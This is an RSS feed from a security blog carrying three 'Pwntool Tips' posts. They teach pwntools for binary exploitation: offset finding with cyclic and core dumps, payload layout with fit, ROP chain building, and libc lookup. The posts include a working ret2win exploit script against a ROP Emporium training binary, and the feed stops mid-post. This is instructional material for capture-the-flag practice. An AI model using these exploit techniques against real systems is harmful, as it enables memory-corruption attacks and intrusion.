<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on [audible]blink</title>
        <link>https://sec.alexflor.es/posts/</link>
        <description>Recent content in Posts on [audible]blink</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <lastBuildDate>Sat, 04 Jan 2020 19:13:37 -0500</lastBuildDate>
        <atom:link href="https://sec.alexflor.es/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Pwntool Tips 3</title>
            <link>https://sec.alexflor.es/posts/2020/01/pwntool-tips-3/</link>
            <pubDate>Sat, 04 Jan 2020 19:13:37 -0500</pubDate>
            
            <guid>https://sec.alexflor.es/posts/2020/01/pwntool-tips-3/</guid>
            <description>Before we start, in part 2 of the series I demonstrated finding asm instructions within a binary using the elf.search() function. We passed bytes ff e4 in order to find the address of a jmp rsp instruction. As it turns out, we can use also the mnemonic if we pass it through asm() first. This way, we don&#39;t have to remember that jmp rsp is ff e4 on amd64 architecture.</description>
            <content type="html"><![CDATA[<p>Before we start, in part 2 of the series I demonstrated finding asm instructions within a binary
using the <code>elf.search()</code> function. We passed bytes <code>ff e4</code> in order to find the address of a <code>jmp rsp</code> instruction. As it turns out, we can use also the mnemonic if we pass it through <code>asm()</code> first.
This way, we don't have to remember that <code>jmp rsp</code> is <code>ff e4</code> on amd64 architecture.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74"> From yesterday </span><span style="color:#e6db74">&#34;&#34;&#34;</span>
In [<span style="color:#ae81ff">2</span>]: e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">pwnable</span><span style="color:#e6db74">&#39;</span>)
In [<span style="color:#ae81ff">3</span>]: next(e<span style="color:#f92672">.</span>search(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xff</span><span style="color:#ae81ff">\xe4</span><span style="color:#e6db74">&#34;</span>))
Out[<span style="color:#ae81ff">3</span>]: <span style="color:#ae81ff">159281</span>

<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74"> Alternate way, with the mnenonic </span><span style="color:#e6db74">&#34;&#34;&#34;</span>
In [<span style="color:#ae81ff">3</span>]: searcher <span style="color:#f92672">=</span> e<span style="color:#f92672">.</span>search( asm(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">jmp rsp</span><span style="color:#e6db74">&#34;</span>) )
In [<span style="color:#ae81ff">4</span>]: searcher<span style="color:#f92672">.</span>next()
Out[<span style="color:#ae81ff">4</span>]: <span style="color:#ae81ff">159281</span>


</code></pre></div><h1 id="autofinding-the-offset-with-cyclic--corefiles">Auto-Finding the Offset with Cyclic &amp; Corefiles</h1>
<p>The <code>cyclic</code> function will generate a deterministic sequence called a
<a href="https://en.wikipedia.org/wiki/De_Bruijn_sequence">De Bruijn</a>
sequence. Since the pattern is always the same, we can rely on the fact that any subsequence will
also be at the same index. That means we can take the sequence at the fault address and search for
the offset within that sequence. Searching is done with the <code>cyclic_find</code> function.</p>
<p><code>Pwntools</code> also knows how to deal with core dumps.</p>
<p>From the <a href="http://docs.pwntools.com/en/stable/elf/corefile.html#using-corefiles-to-automate-exploitation">Docs</a>:</p>
<blockquote>
<p>Core dumps are extremely useful when writing exploits, even outside of the normal act of debugging things.</p>
</blockquote>
<p>We're going use the first 64-bit challenge from
<a href="https://ropemporium.com/challenge/ret2win.html">ROP Emporium</a>.
The challenges here are specifically geared toward practicing ROP techniques, so they remove most
reversing and bug-hunting barriers and tell you outright that the overflow length for every
challenge is 40. As a former teacher, I approve of this method. We'll use this known-good value of
40 to test with.</p>
<p>To automatically find the offset:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
In [<span style="color:#ae81ff">2</span>]: context<span style="color:#f92672">.</span>clear(arch<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">amd64</span><span style="color:#e6db74">&#34;</span>)
In [<span style="color:#ae81ff">3</span>]: io <span style="color:#f92672">=</span> process(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./ret2win</span><span style="color:#e6db74">&#39;</span>)
In [<span style="color:#ae81ff">4</span>]: io<span style="color:#f92672">.</span>recv()
In [<span style="color:#ae81ff">5</span>]: io<span style="color:#f92672">.</span>sendline( cyclic(<span style="color:#ae81ff">128</span>, n<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span> )
In [<span style="color:#ae81ff">6</span>]: io<span style="color:#f92672">.</span>wait()
[<span style="color:#f92672">*</span>] Process <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./ret2win</span><span style="color:#e6db74">&#39;</span> stopped <span style="color:#66d9ef">with</span> exit code <span style="color:#f92672">-</span><span style="color:#ae81ff">11</span> (SIGSEGV) (pid <span style="color:#ae81ff">1108287</span>)

In [<span style="color:#ae81ff">7</span>]: coredump <span style="color:#f92672">=</span> Core(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">./core.ret2win.1108287</span><span style="color:#e6db74">&#34;</span>)
[x] Parsing corefile<span style="color:#f92672">.</span><span style="color:#f92672">.</span><span style="color:#f92672">.</span>
    Arch:      amd64<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>little
    RIP:       <span style="color:#ae81ff">0x400810</span>
    RSP:       <span style="color:#ae81ff">0x7ffcef76b438</span>
    Fault:     <span style="color:#ae81ff">0x6161616161616166</span>

In [<span style="color:#ae81ff">8</span>]: cyclic_find(coredump<span style="color:#f92672">.</span>fault_addr, n<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>)
Out[<span style="color:#ae81ff">8</span>]: <span style="color:#ae81ff">40</span>
</code></pre></div><p>Here's what a fully automated exploit might look like using what we've learned from the past 3
posts.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
context<span style="color:#f92672">.</span>arch<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">amd64</span><span style="color:#e6db74">&#34;</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">overflow</span>(io, data):
    io<span style="color:#f92672">.</span>recv()
    io<span style="color:#f92672">.</span>sendline(data)

exe <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">ret2win</span><span style="color:#e6db74">&#34;</span>
io  <span style="color:#f92672">=</span> process(exe)

overflow( io, cyclic(<span style="color:#ae81ff">100</span>, n<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>) )
io<span style="color:#f92672">.</span>wait()

elf_file <span style="color:#f92672">=</span> ELF(exe)
offset   <span style="color:#f92672">=</span> cyclic_find( io<span style="color:#f92672">.</span>corefile<span style="color:#f92672">.</span>fault_addr, n<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span> )
payload  <span style="color:#f92672">=</span> fit({ offset: elf_file<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>ret2win })

io <span style="color:#f92672">=</span> process(exe)
overflow(io, payload)
success( io<span style="color:#f92672">.</span>recvline() )
</code></pre></div><p>Output:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">dev ❯❯ python exp.py
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;./ret2win&#39;</span>: pid <span style="color:#ae81ff">1248672</span>
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Process <span style="color:#e6db74">&#39;./ret2win&#39;</span> stopped with exit code -11 <span style="color:#f92672">(</span>SIGSEGV<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>pid 1248672<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Parsing corefile...: Done
    Arch:      amd64-64-little
    RIP:       0x400810
    RSP:       0x7ffcf9977c28
    Fault:     0x6161616161616166
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;./ret2win&#39;</span>: pid <span style="color:#ae81ff">1248677</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> b<span style="color:#e6db74">&#34;Thank you! Here&#39;s your flag:ROPE{a_placeholder_32byte_flag!}\n&#34;</span>
</code></pre></div><p>Check out the <code>cyclic</code> <a href="http://docs.pwntools.com/en/stable/util/cyclic.html">docs here</a></p>
]]></content>
        </item>
        
        <item>
            <title>Pwntool Tips 2</title>
            <link>https://sec.alexflor.es/posts/2020/01/pwntool-tips-2/</link>
            <pubDate>Fri, 03 Jan 2020 13:13:01 -0500</pubDate>
            
            <guid>https://sec.alexflor.es/posts/2020/01/pwntool-tips-2/</guid>
            <description>ELF and ROP Modules Pwntools gives us the ability to interact with ELFs and shared libraries in a programmatic way.
 Full ELF docs Full ROP docs  ELF fit One of the Class-level members I want to talk about is fit. I&#39;ve had to create lines in my exploit code that look like this:
buf_len = 128 pad_len = buf_len - (len(gadgets) + len(mprotect)) payload = gadgets payload += mprotect payload += &amp;#34;A&amp;#34; * pad_len payload += canary payload += &amp;#34;A&amp;#34; * 16 # junk payload += jmprsp fit allows you to be declarative about where each of your exploit components should be in your payload.</description>
            <content type="html"><![CDATA[<h1 id="elf-and-rop-modules">ELF and ROP Modules</h1>
<p>Pwntools gives us the ability to interact with ELFs and shared libraries in a programmatic way.</p>
<ul>
<li>Full <a href="http://docs.pwntools.com/en/stable/elf/elf.html">ELF docs</a></li>
<li>Full <a href="http://docs.pwntools.com/en/stable/rop/rop.html">ROP docs</a></li>
</ul>
<h2 id="elf">ELF</h2>
<h3 id="fit">fit</h3>
<p>One of the Class-level members I want to talk about is <code>fit</code>. I've had to create lines in my
exploit code that look like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">buf_len <span style="color:#f92672">=</span> <span style="color:#ae81ff">128</span>
pad_len <span style="color:#f92672">=</span> buf_len <span style="color:#f92672">-</span> (len(gadgets) <span style="color:#f92672">+</span> len(mprotect))

payload  <span style="color:#f92672">=</span> gadgets
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> mprotect
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> pad_len
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> canary
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span> <span style="color:#75715e"># junk</span>
payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> jmprsp
</code></pre></div><p><code>fit</code> allows you to be declarative about where each of your exploit components should be in your
payload.</p>
<p>The same payload, using <code>fit</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">payload <span style="color:#f92672">=</span> fit({
        <span style="color:#ae81ff">0</span>: gadgets,
        <span style="color:#ae81ff">8</span>: mprotect,
        <span style="color:#ae81ff">128</span>: canary,
        <span style="color:#ae81ff">144</span>: jmprsp
    })
</code></pre></div><p>All padding between the declared sections is inserted for you. Bonus, it uses the same pattern
that <code>cyclic</code> uses, so if your binary crashes during the exploit, the resulting address in the
crash screen of GDB can be inserted into <code>cyclic_find</code> and it will tell you where the cause of the
crash is in your payload. Much like using <code>pattern_create</code> to find an initial buffer length. I'll
go into <code>cyclic</code> in another blog post.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
In [<span style="color:#ae81ff">2</span>]: exp <span style="color:#f92672">=</span> fit({
   <span style="color:#f92672">.</span><span style="color:#f92672">.</span><span style="color:#f92672">.</span>:     <span style="color:#ae81ff">4</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">ZZZZ</span><span style="color:#e6db74">&#34;</span>,
   <span style="color:#f92672">.</span><span style="color:#f92672">.</span><span style="color:#f92672">.</span>:     <span style="color:#ae81ff">12</span>: <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">XXXX</span><span style="color:#e6db74">&#34;</span>
   <span style="color:#f92672">.</span><span style="color:#f92672">.</span><span style="color:#f92672">.</span>: })

In [<span style="color:#ae81ff">3</span>]: exp
Out[<span style="color:#ae81ff">3</span>]: <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">aaaaZZZZcaaaXXXX</span><span style="color:#e6db74">&#39;</span>
</code></pre></div><h3 id="symbols">symbols</h3>
<p><code>symbols</code> will return a <code>dotdict</code> of symbol-to-address mappings. <code>sym</code> is a convenience
alias to <code>symbols</code>. A <code>dotdict</code> is a class within <code>pwntools</code> that allows dotted access to the
underlying python <code>dict</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
In [<span style="color:#ae81ff">2</span>]: e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">pwnable</span><span style="color:#e6db74">&#34;</span>)
In [<span style="color:#ae81ff">3</span>]: e<span style="color:#f92672">.</span>symbols
Out[<span style="color:#ae81ff">3</span>]:
{<span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">__gmon_start__</span><span style="color:#e6db74">&#39;</span>: <span style="color:#ae81ff">4207552</span>,
 <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">__libc_start_main</span><span style="color:#e6db74">&#39;</span>: <span style="color:#ae81ff">4207544</span>,
 <span style="color:#f92672">.</span><span style="color:#f92672">.</span><span style="color:#f92672">.</span>snip<span style="color:#f92672">.</span><span style="color:#f92672">.</span><span style="color:#f92672">.</span>
 <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">read</span><span style="color:#e6db74">&#39;</span>: <span style="color:#ae81ff">4198480</span>,
 <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">setvbuf</span><span style="color:#e6db74">&#39;</span>: <span style="color:#ae81ff">4198512</span>,
 <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">stdout</span><span style="color:#e6db74">&#39;</span>: <span style="color:#ae81ff">4207640</span>,
 <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">strcmp</span><span style="color:#e6db74">&#39;</span>: <span style="color:#ae81ff">4198496</span>,
 <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">strlen</span><span style="color:#e6db74">&#39;</span>: <span style="color:#ae81ff">4198444</span>}

In [<span style="color:#ae81ff">4</span>]: e<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>read
Out[<span style="color:#ae81ff">4</span>]: <span style="color:#ae81ff">4198480</span>
</code></pre></div><h3 id="search">search</h3>
<p><code>search</code> takes a sequence of bytes and returns an iterator of possible matches. Handy if you want
to get the location of say &ldquo;/bin/sh&rdquo; inside of <code>libc</code>, or even just to find specific instructions
you might want to use in your payload.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
In [<span style="color:#ae81ff">2</span>]: e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/lib/libc.so.6</span><span style="color:#e6db74">&#39;</span>)
In [<span style="color:#ae81ff">3</span>]: next(e<span style="color:#f92672">.</span>search(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#e6db74">&#34;</span>))
Out[<span style="color:#ae81ff">3</span>]: <span style="color:#ae81ff">1618340</span>
</code></pre></div><p>Finding a JMP RSP (<code>ff e4</code>) instruction:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
In [<span style="color:#ae81ff">2</span>]: e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">pwnable</span><span style="color:#e6db74">&#39;</span>)
In [<span style="color:#ae81ff">3</span>]: next(e<span style="color:#f92672">.</span>search(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xff</span><span style="color:#ae81ff">\xe4</span><span style="color:#e6db74">&#34;</span>))
Out[<span style="color:#ae81ff">3</span>]: <span style="color:#ae81ff">159281</span>
</code></pre></div><h2 id="rop">ROP</h2>
<p>The ROP module facilitates creating ROP chains by creating a python-style call API of sorts for
calling symbols located in the binary. We'll use <code>mprotect</code> for our example.</p>
<p>From <code>man 3 mprotect</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">NAME
       mprotect — set protection of memory mapping

SYNOPSIS
       #include &lt;sys/mman.h&gt;
       int mprotect(void *addr, size_t len, int prot);
</code></pre></div><h3 id="call">call</h3>
<p>Call will allow you to call the symbol you designate as the first param, and take subsequent
arguments to the callee as a list. The function doesn't return anything, but modifies the
instance of the ROP class. This allows for you to continue to chain more calls together. Once
you're ready, you can <code>bytes(rop)</code> or <code>rop.chain()</code> to get the resulting payload. As a convenience,
symbols are also directly callable from the <code>ROP</code> instance.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
In [<span style="color:#ae81ff">2</span>]: context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">amd64</span><span style="color:#e6db74">&#34;</span>
In [<span style="color:#ae81ff">3</span>]: rop <span style="color:#f92672">=</span> ROP(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./haxme</span><span style="color:#e6db74">&#39;</span>)

In [<span style="color:#ae81ff">4</span>]: rop<span style="color:#f92672">.</span>dump()
Out[<span style="color:#ae81ff">4</span>]: <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span>

In [<span style="color:#ae81ff">5</span>]: rop<span style="color:#f92672">.</span>call(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">mprotect</span><span style="color:#e6db74">&#39;</span>, [<span style="color:#ae81ff">0x12345678</span>, <span style="color:#ae81ff">0x1000</span>, <span style="color:#ae81ff">0x7</span>])

In [<span style="color:#ae81ff">6</span>]: <span style="color:#66d9ef">print</span>(rop<span style="color:#f92672">.</span>dump())
<span style="color:#ae81ff">0x0000</span>:         <span style="color:#ae81ff">0x43e369</span> pop rdx; pop rsi; ret
<span style="color:#ae81ff">0x0008</span>:              <span style="color:#ae81ff">0x7</span> [arg2] rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">7</span>
<span style="color:#ae81ff">0x0010</span>:           <span style="color:#ae81ff">0x1000</span> [arg1] rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">4096</span>
<span style="color:#ae81ff">0x0018</span>:         <span style="color:#ae81ff">0x401d93</span> pop rdi; ret
<span style="color:#ae81ff">0x0020</span>:       <span style="color:#ae81ff">0x12345678</span> [arg0] rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">305419896</span>
<span style="color:#ae81ff">0x0030</span>:         <span style="color:#ae81ff">0x43e369</span> pop rdx; pop rsi; ret

In [<span style="color:#ae81ff">7</span>]: rop<span style="color:#f92672">.</span>read(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x1234</span>, <span style="color:#ae81ff">0x100</span>)

In [<span style="color:#ae81ff">8</span>]: <span style="color:#66d9ef">print</span>(rop<span style="color:#f92672">.</span>dump())
<span style="color:#ae81ff">0x0000</span>:         <span style="color:#ae81ff">0x43e369</span> pop rdx; pop rsi; ret
<span style="color:#ae81ff">0x0008</span>:              <span style="color:#ae81ff">0x7</span> [arg2] rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">7</span>
<span style="color:#ae81ff">0x0010</span>:           <span style="color:#ae81ff">0x1000</span> [arg1] rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">4096</span>
<span style="color:#ae81ff">0x0018</span>:         <span style="color:#ae81ff">0x401d93</span> pop rdi; ret
<span style="color:#ae81ff">0x0020</span>:       <span style="color:#ae81ff">0x12345678</span> [arg0] rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">305419896</span>
<span style="color:#ae81ff">0x0028</span>:         <span style="color:#ae81ff">0x43bf50</span> mprotect
<span style="color:#75715e">####</span>
<span style="color:#ae81ff">0x0030</span>:         <span style="color:#ae81ff">0x43e369</span> pop rdx; pop rsi; ret
<span style="color:#ae81ff">0x0038</span>:            <span style="color:#ae81ff">0x100</span> [arg2] rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">256</span>
<span style="color:#ae81ff">0x0040</span>:           <span style="color:#ae81ff">0x1234</span> [arg1] rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">4660</span>
<span style="color:#ae81ff">0x0048</span>:         <span style="color:#ae81ff">0x401d93</span> pop rdi; ret
<span style="color:#ae81ff">0x0050</span>:              <span style="color:#ae81ff">0x0</span> [arg0] rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
<span style="color:#ae81ff">0x0058</span>:         <span style="color:#ae81ff">0x43b3e0</span> read
</code></pre></div><h3 id="gadgets-and-findgadget"><code>gadgets</code> and <code>find_gadget</code></h3>
<p>Upon instantiation of a ROP object, you may see log output mention something like &ldquo;Loading
Gadgets&rdquo;. It's self explanatory. I do want to mention that <code>pwntools</code> gadget finder isn't as
robust as something like
<a href="https://github.com/sashs/Ropper">ropper</a>.
That said, it's still a very helpful and useful function. <code>gadgets</code> contains your dict of gadget
objects and <code>find_gadget</code> is simply a convenience methods for searching the <code>gadgets</code> dict.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">In [<span style="color:#ae81ff">1</span>]: <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
In [<span style="color:#ae81ff">2</span>]: rop <span style="color:#f92672">=</span> ROP(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./haxme</span><span style="color:#e6db74">&#39;</span>)

In [<span style="color:#ae81ff">3</span>]: len(rop<span style="color:#f92672">.</span>gadgets)
Out[<span style="color:#ae81ff">3</span>]: <span style="color:#ae81ff">109</span>

In [<span style="color:#ae81ff">4</span>]: gdt <span style="color:#f92672">=</span> rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">pop rsi</span><span style="color:#e6db74">&#34;</span>])
In [<span style="color:#ae81ff">5</span>]: gdt
Out[<span style="color:#ae81ff">5</span>]: Gadget(<span style="color:#ae81ff">0x4006ab</span>, [<span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">pop rsi</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">pop r15</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">pop rbp</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">ret</span><span style="color:#e6db74">&#39;</span>], [<span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">rsi</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">r15</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">u</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">rbp</span><span style="color:#e6db74">&#39;</span>], <span style="color:#ae81ff">0x10</span>)

In [<span style="color:#ae81ff">6</span>]: gdt<span style="color:#f92672">.</span>address
Out[<span style="color:#ae81ff">6</span>]: <span style="color:#ae81ff">4196011L</span>
</code></pre></div><h3 id="srop">SROP</h3>
<p>When attempting to call something like <code>mprotect</code> in a binary that doesn't explicitly have a symbol
for it, <code>pwntools</code> will attempt a syscall instead, using SIGRET/SROP. I've written about this
technique in the past.</p>
<p><a href="https://sec.alexflor.es/posts/2019/12/abusing-signals-with-sigrop-exploits/">Abusing Signals with SIGROP</a></p>
<p>Happy refactoring, and see you next time!</p>
]]></content>
        </item>
        
        <item>
            <title>Pwntool Tips 1</title>
            <link>https://sec.alexflor.es/posts/2020/01/pwntool-tips-1/</link>
            <pubDate>Thu, 02 Jan 2020 20:56:48 -0500</pubDate>
            
            <guid>https://sec.alexflor.es/posts/2020/01/pwntool-tips-1/</guid>
            <description>Do you like clean exploit scripts? Do you fidget with and refactor them long after you&#39;ve submitted the flag? If so, then this blog series is right up your alley!
At some point you&#39;ll be developing an exploit that requires you to return to some shared library, most likely libc. Problem is there&#39;s a good chance the libc on your local dev box is not same version as the one on the remote box.</description>
            <content type="html"><![CDATA[<p>Do you like clean exploit scripts? Do you fidget with and refactor them long after you've submitted
the flag? If so, then this blog series is right up your alley!</p>
<p>At some point you'll be developing an exploit that requires you to return to some shared library,
most likely <code>libc</code>. Problem is there's a good chance the <code>libc</code> on your local dev box is not same
version as the one on the remote box. You may already know about the <code>libc</code> database <a href="https://github.com/niklasb/libc-database">here on
GitHub</a>. You'll have to leak a few addresses from the
remote box in order to be able to search for the right version.</p>
<p>You can also look up addresses on a webapp that uses the <code>libc</code> database as a backend.
<a href="https://libc.blukat.me/">https://libc.blukat.me/</a></p>
<p><img src="2.png" alt="blukat"></p>
<p>Instead of keeping 2 sets of addresses and offsets (local and remote) you can use the <code>pwnlib.libcdb</code>
<a href="http://docs.pwntools.com/en/stable/libcdb.html?highlight=libcdb#module-pwnlib.libcdb">Pwntool's module</a></p>
<p>Once you've identified which <code>libc</code> is on the remote server, you can take its buildid or hash and
pop it into pwntools. Then you can start rop-chaining or symbol searching right from the comfort of
your exploit script.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">leaked_got_read <span style="color:#f92672">=</span> leak_read()
exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">pwnable</span><span style="color:#e6db74">&#39;</span>)

<span style="color:#66d9ef">if</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">remote</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> sys<span style="color:#f92672">.</span>argv:
    libc <span style="color:#f92672">=</span> exe<span style="color:#f92672">.</span>libc
<span style="color:#66d9ef">else</span>:
    dl_libc <span style="color:#f92672">=</span> libcdb<span style="color:#f92672">.</span>search_by_md5(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">50390b2ae8aaa73c47745040f54e602f</span><span style="color:#e6db74">&#34;</span>)
    libc <span style="color:#f92672">=</span> ELF(dl_libc)

libc_base <span style="color:#f92672">=</span> leaked_got_read  <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>read
</code></pre></div><p>Debug log output during script execution shows that pwntools is handling the file download and
caching for you.</p>
<p>First run:</p>
